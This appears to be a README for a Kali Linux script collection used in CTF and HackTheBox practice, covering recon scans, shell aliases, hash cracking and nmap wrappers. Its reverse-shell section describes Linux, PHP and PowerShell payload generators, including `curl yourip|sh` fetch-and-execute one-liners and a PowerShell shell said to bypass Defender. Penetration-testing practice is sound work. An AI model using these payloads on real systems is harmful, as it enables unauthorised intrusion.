# Setup for Kail for CTFs, HTB, THM etc


This is a collection of scripts used while doing differnt ctf's
# Install
This will install the scripts and setup requeired software from a base kali install. 

```
sh -c "curl -fsSL https://raw.githubusercontent.com/sparksbenjamin/kali-scripts/master/install.sh"
```
# Scripts
## Scan.sh
This will do some basic recon and generate files for later review of the machine. This does a simple port check with massscan then takes those ports and runs a full nmap scan on the open ports. 
```
./scan.sh $IP_ADDRESS
```
## generate_usernames.py
This will prompt you for First Name, Last Name and Middle name.  It will generate some standard usernames using that information
### Useage
```
python generate_usernames.py
```
# Aliases
## Misc
### > www

Starts a HTTP server on port 80 in the current directory. Also prints a list of the IP address associated with each NIC, shows the current directory path and lists the files. 
Example: 
```
┌──(user㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### Notes
> - Sudo is used to ensure being able to listen on port 80

### > tun0

Copies the IP addres of the tun0 interface to the clipboard. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ tun0 
```
Clipboard contents after:
```
10.10.14.41
```

### > mkdir_cd
Often when making a directory I want to directly `cd` into it after. This does exactly that.  
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ mkdir_cd pepega

┌──(user㉿kali)-[~/user/pepega]
└─$ 
```

## Reverse shells
### > gen_lin_rev $ip $port 
Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. 
Example: 
```
┌──(user㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/user/index.html
```
> #### Notes
> - I really like how the `curl yourip|sh` payload doesn't really have any badchars besides possibly the space and the pipe. When spaces form an issue there are [ways around this](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) and the pipe can be bypassed by just downloading and executing separately.
> - If curl is not installed on the remote machine you can try `wget yourip -O-|sh`
 

### > gen_php_rev $ip $port

Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  
Example: 
```
┌──(user㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/user/user.php
```
### > gen_ps_rev $ip $port
Generates a Powershell reverse shell with the supplied ip and port which at the moment of last usage bypassed defender. I'm not sure who to give credit for this payload. 
Example:
```
┌──(user㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
Clipboard contents after:
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## TTY upgrades
### > py_tty_upgrade
Copies the python(2) tty upgrade command to the clipboard. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ py_tty_upgrade
```
Clipboard contents after:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### Notes
> - Requires `xclip` to be installed

### > py3_tty_upgrade
Exactly the same as above but with python3. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ py3_tty_upgrade 
```
Clipboard contents after:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
> #### Notes
> - Requires `xclip` to be installed

### > script_tty_upgrade
When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ script_tty_upgrade
```
Clipboard contents after:
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### Notes
> - Requires `xclip` to be installed

### > tty_fix
Runs `stty raw -echo; fg; reset` should be used after using one of the above tty upgrades.

### > tty_conf
Grabs the current tty settings (number of rows and columns) and copies a oneliner to the clipboard that can be pasted straight into your reverse shell window to get those settings to match up. This fixes the issue of line wrapping occuring halfway in your terminal. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ tty_conf               
```
Clipboard contents after:
```
stty rows 30 columns 116
```
> #### Notes
> - Requires `xclip` to be installed

## Hashcracking
### > rock_john $hash_file (extra arguments)
Instead of manually supplying rockyou as an argument with `--wordlist=/usr/share/wordlists/rockyou.txt` (without auto completion :/) this alias injects that argument and thus can be used to try and crack a hash using JohnTheRipper and the rockyou wordlist more easily. 
Example: 
```
┌──(user㉿kali)-[~/user]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
user             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### Notes
> - Kali seems to have fixed auto completion for John in 2022.2! This alias still saves you some effort though ;)
## Portscanning
### > nmap_tcp $ip (extra arguments)
Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
Example: 
```
┌──(user㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/user/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### Notes
> - This only scans the default TCP ports. Add `-p-` as an argument to scan all ports.
> - Uses `sudo` to get the privileges required for a SYN scan
### > nmap_udp $ip (extra arguments)
Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
Example: 
```
┌──(user㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/user/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### Notes
> - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.
> - Uses `sudo` to get the privileges required for a UDP scan
